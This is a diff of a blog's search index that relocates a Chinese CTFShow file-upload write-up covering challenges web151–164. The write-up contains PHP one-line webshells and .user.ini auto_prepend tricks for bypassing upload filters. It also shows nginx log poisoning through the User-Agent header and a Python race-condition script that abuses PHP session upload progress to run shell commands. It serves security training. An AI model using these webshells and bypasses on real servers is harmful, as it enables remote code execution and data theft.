@@ -62,6 +62,172 @@
       </categories>
   </entry>
   <entry>
+    <title>CTFShow-文件上传</title>
+    <url>/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1 id="CTFShow-文件上传"><a href="#CTFShow-文件上传" class="headerlink" title="CTFShow 文件上传"></a>CTFShow 文件上传</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><span id="more"></span>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151.png"></p>
+<p>先来上传一张正常图片发现不能上传jpg格式，可以上传png格式.并返回了上传路径: /upload/2.png</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
+<p>使用 Burp 抓包将一句话图片更改后缀为.php ,并成功返回了上传路径 /upload/yjh.php</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_2.png"></p>
+<p>蚁剑连接。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_3.png"></p>
+<p>成功在上一级目录中找到了flag<br><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_4.png"></p>
+<p>也可以不用蚁剑，直接访问上传的文件，并post 传入 一句话木马的密码=你想构造的语句。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_5.png"></p>
+<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>后端校验要严密</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152.png"></p>
+<p>上传图片马:<?php eval($_POST[mm]);?> 并抓包修改后缀</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_1.png"></p>
+<p>可见上传成功，似乎和web151一样，蚁剑连接或访问试试</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_2.png"></p>
+<p>当前目录没有，再试试上一级目录。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_3.png"></p>
+<p>还是在上一级目录。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_4.png"></p>
+<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153.png"></p>
+<p>仍然一样的页面</p>
+<p>继续web152的套路试试</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_1.png"></p>
+<p>显示内容为 文件类型不和规，那肯定是对写入的内容进行了过滤。但是不知道过滤了哪些内容。</p>
+<p>这题涉及到了一个新的内容： .user.ini 文件：简单来说是用户对环境的配置文件。</p>
+<p>先上传 .user.ini.png 文件，抓包删除.png后缀</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a <span class="comment">// 文件格式，告知系统这是 GIF89a格式生成图形</span></span><br><span class="line">auto_prepend_file=yjh.png <span class="comment">// 要执行的文件名称,将yjh.png当作Php 执行</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
+<p>再上传 yjh.png木马</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_3.png"></p>
+<p>访问 /upload/index.php 文件</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_4.png"></p>
+<h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154.png"></p>
+<p>仍然一样的页面</p>
+<p>注意和前面一样需要上传  .user.ini 文件才能将 png解析为 php 文件。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
+<p>上传一个图片马 yjh.png : </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154_1.png"></p>
+<p>页面显示：文件上传失败，失败原因：文件内容不合规。</p>
+<p>那么可能对文件内容做了过滤，试试PHP短标签，php有很多短标签但是只有 </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>(xxx)<span class="meta">?&gt;</span>  = <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (xxx)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> 这种形式的使用不受PHP配置的限制，其它几种形式需要PHP开启什么什么才能，不作展示，记不到了。我建议以后直接写这种短标签的形式。</p>
+<p>修改 yjh.png 的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_post</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时修改后的上传成功，并成功返回上传路径。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154_2.png"></p>
+<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>上传界面仍然一样！</p>
+<p>继续web154得套路试试:</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
+<p>先上传 .user.ini 文件 再上传 yjh.png</p>
+<p>yjh.png : </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web155.png"></p>
+<p>上传成功！蚁剑连接或者 访问 /upload/index.php 文件</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
+<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>上传界面仍然一样！</p>
+<p>继续web154得套路试试:</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
+<p>先上传 .user.ini 文件 再上传 yjh.png</p>
+<p>yjh.png : </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156.png"></p>
+<p>哦豁，文件内心不合规，看来又是对什么字符进行了过滤。试试之后发现 把 中括号 [] 给干没了，换成大括号 {}</p>
+<p>yjh.png</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;mm&#125;);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156_1.png"></p>
+<p>上传成功！蚁剑连接或者 访问 /upload/index.php 文件</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156_2.png"></p>
+<h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>继续之前得套路先上传 .user.ini 文件，再传一句话又过滤了其他字符，那就不要一句话，直接 tac ../*</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;tac ../*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web157.png"></p>
+<p>访问 /upload/index.php 文件</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web157_1.png"></p>
+<p>如图得到 flag, 同时 第二个红框 也显示出了过滤了哪些字符：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> !preg_match(<span class="string">&#x27;/php|\&#123;|\[|\;/i&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>完全可以使用 web157中的方法得到 flag</p>
+<p>最后得到过滤了 :</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/php|\&#123;|\[|\;|log/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>仍然和之前先上传 .user.ini 再上传yjh.png</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;cat ../*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此时显示 上传类型不合规，在上一题知道 过滤了 php, {, [, ;, log 那这里可能过滤了 system函数，换成其他试试：passthru, passthru也不对，那可能把小括号过滤了。</p>
+<p>可以使用 反引号 `` PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回, 反引号与 shell_exec()函数功能一样。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`nl ..<span class="comment">/*`?&gt;</span></span><br><span class="line"><span class="comment">// tac, cat ,nl, less, 等等</span></span><br><span class="line"><span class="comment">// nl 需要查看源代码</span></span><br></pre></td></tr></table></figure>
+
+<p>访问 /upload/index.php</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web159.png"></p>
+<p>页面最后可以看到确实过滤了小括号 (</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web159_1.png"></p>
+<h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>继续使用 web159中 的方法失败，显示 文件类型不合规</p>
+<p>这又不知道过滤了些什么东东。难搞。不查不知道，一查居然用nginx的日志包含来读取flag</p>
+<p>首先还是先上传 .user.ini 文件，方法内容不变。</p>
+<p>再上传 yjh.png: </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.g.<span class="string">&quot;/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span> <span class="comment">// log 被过滤了，用 . （点号）拼接</span></span><br></pre></td></tr></table></figure>
+
+<p>访问 /upload/index.php 将得到 服务器日志信息:</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160.png"></p>
+<p>日志成功读取了，接下来 修改 User-Agent的内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;tac ../*&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改 User-Agent：为 php 代码，再访问日志将会执行这行代码!</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160_1.png"></p>
+<p>如图在网页根目录下修改，再访问 upload/index.php</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160_2.png"></p>
+<p>如图得到 flag, 来看看到底过滤了什么内容:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> !preg_match(<span class="string">&#x27;/php|\&#123;|\[|\;|log|\(| |\`/i&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>
+
+<p>也就多过滤了空格，反引号，所以，通过日志的方式前面几题应该也可以成功，所以，这种方法要记住！</p>
+<h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>上传界面仍然没变。还是试试之前的方法，先上传 .user.ini 文件。</p>
+<p>web160中的方法失败了，提示 文件类型不合规，这肯定又过滤了其它字符。看了wp才知道，这时使用了 getimagesize()函数，这个函数会检测图片的十六进制数来判断文件是否是真正的图片文件。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161.png"></p>
+<p>先来看看正常的 png 图片的是怎样的,winhex打开图片，下载连接:<a href="http://www.winhex.com/winhex.zip">http://www.winhex.com/winhex.zip</a></p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_2.png"></p>
+<p>如图所示显示为: <strong>89 50 4E 47 0D 0A 1A 0A</strong></p>
+<p>因此需要将 原来的yjh 添加这串十六进制数来表示是正常的png图片！</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_3.png"></p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_4.png"></p>
+<p>如上图成功上传修改后的yjh.png文件。</p>
+<p>现在访问 <a href="http://43999a00-fa05-4fa9-9215-5c1fdf53bd63.challenge.ctf.show:8080/upload/index.php">http://43999a00-fa05-4fa9-9215-5c1fdf53bd63.challenge.ctf.show:8080/upload/index.php</a></p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_5.png"></p>
+<p>成功得到日志文件</p>
+<p>接下来 修改 User-Agent 为 ：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;cat ../*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后访问 upload/index.php 即可查看到上一级目录中的所有内容，同时过滤了什么东西也显示出来了。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_6.png"></p>
+<p>过滤的内容：</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_7.png"></p>
+<p>如图：正则的过滤跟上一题比较没有变，而是在 文中 增加了 getimagesize() 函数！</p>
+<h2 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h2><p>这道题，要利用seeiion条件竞争，在前面 **web82 **中有用到过此方法。且过滤了 小数点 号。</p>
+<p>先上传 .user.ini 内容为:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=test</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web162.png"></p>
+<p>之前是读取 log 文件，这次 读取 .user.ini 中的 test</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web162_1.png"></p>
+<p>上脚本: session.py:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://4aee5c93-e165-4911-bcc0-4c7d1b6961b8.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>) </span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat ../*&quot;);?&gt;&#x27;</span>&#125;, <span class="comment"># 注意</span></span><br><span class="line">            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.get(url + <span class="string">&#x27;/upload/index.php&#x27;</span>) <span class="comment"># 注意</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]retrying...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web162_3.png"></p>
+<p>成功读取到了 flag。</p>
+<p>过滤的内容: 的确过滤 小数点 .</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web162_4.png"></p>
+<h2 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h2><p>同<strong>web162</strong></p>
+<h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2>]]></content>
+      <categories>
+        <category>CTF笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CTFShow-反序列化</title>
     <url>/2021/09/13/CTFShow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
     <content><![CDATA[<h1 id="CTFShow-反序列化"><a href="#CTFShow-反序列化" class="headerlink" title="CTFShow 反序列化"></a>CTFShow 反序列化</h1><span id="more"></span>
@@ -254,172 +420,6 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
 
 ]]></content>
-      <categories>
-        <category>CTF笔记</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>CTFShow-文件上传</title>
-    <url>/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<h1 id="CTFShow-文件上传"><a href="#CTFShow-文件上传" class="headerlink" title="CTFShow 文件上传"></a>CTFShow 文件上传</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><span id="more"></span>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151.png"></p>
-<p>先来上传一张正常图片发现不能上传jpg格式，可以上传png格式.并返回了上传路径: /upload/2.png</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
-<p>使用 Burp 抓包将一句话图片更改后缀为.php ,并成功返回了上传路径 /upload/yjh.php</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_2.png"></p>
-<p>蚁剑连接。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_3.png"></p>
-<p>成功在上一级目录中找到了flag<br><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_4.png"></p>
-<p>也可以不用蚁剑，直接访问上传的文件，并post 传入 一句话木马的密码=你想构造的语句。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_5.png"></p>
-<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>后端校验要严密</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152.png"></p>
-<p>上传图片马:<?php eval($_POST[mm]);?> 并抓包修改后缀</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_1.png"></p>
-<p>可见上传成功，似乎和web151一样，蚁剑连接或访问试试</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_2.png"></p>
-<p>当前目录没有，再试试上一级目录。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_3.png"></p>
-<p>还是在上一级目录。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_4.png"></p>
-<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153.png"></p>
-<p>仍然一样的页面</p>
-<p>继续web152的套路试试</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_1.png"></p>
-<p>显示内容为 文件类型不和规，那肯定是对写入的内容进行了过滤。但是不知道过滤了哪些内容。</p>
-<p>这题涉及到了一个新的内容： .user.ini 文件：简单来说是用户对环境的配置文件。</p>
-<p>先上传 .user.ini.png 文件，抓包删除.png后缀</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a <span class="comment">// 文件格式，告知系统这是 GIF89a格式生成图形</span></span><br><span class="line">auto_prepend_file=yjh.png <span class="comment">// 要执行的文件名称,将yjh.png当作Php 执行</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
-<p>再上传 yjh.png木马</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_3.png"></p>
-<p>访问 /upload/index.php 文件</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_4.png"></p>
-<h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154.png"></p>
-<p>仍然一样的页面</p>
-<p>注意和前面一样需要上传  .user.ini 文件才能将 png解析为 php 文件。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
-<p>上传一个图片马 yjh.png : </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154_1.png"></p>
-<p>页面显示：文件上传失败，失败原因：文件内容不合规。</p>
-<p>那么可能对文件内容做了过滤，试试PHP短标签，php有很多短标签但是只有 </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>(xxx)<span class="meta">?&gt;</span>  = <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (xxx)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p> 这种形式的使用不受PHP配置的限制，其它几种形式需要PHP开启什么什么才能，不作展示，记不到了。我建议以后直接写这种短标签的形式。</p>
-<p>修改 yjh.png 的内容为:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_post</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>此时修改后的上传成功，并成功返回上传路径。</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154_2.png"></p>
-<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>上传界面仍然一样！</p>
-<p>继续web154得套路试试:</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
-<p>先上传 .user.ini 文件 再上传 yjh.png</p>
-<p>yjh.png : </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web155.png"></p>
-<p>上传成功！蚁剑连接或者 访问 /upload/index.php 文件</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
-<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>上传界面仍然一样！</p>
-<p>继续web154得套路试试:</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
-<p>先上传 .user.ini 文件 再上传 yjh.png</p>
-<p>yjh.png : </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156.png"></p>
-<p>哦豁，文件内心不合规，看来又是对什么字符进行了过滤。试试之后发现 把 中括号 [] 给干没了，换成大括号 {}</p>
-<p>yjh.png</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;mm&#125;);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156_1.png"></p>
-<p>上传成功！蚁剑连接或者 访问 /upload/index.php 文件</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156_2.png"></p>
-<h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>继续之前得套路先上传 .user.ini 文件，再传一句话又过滤了其他字符，那就不要一句话，直接 tac ../*</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;tac ../*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web157.png"></p>
-<p>访问 /upload/index.php 文件</p>
-<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web157_1.png"></p>
-<p>如图得到 flag, 同时 第二个红框 也显示出了过滤了哪些字符：</p>
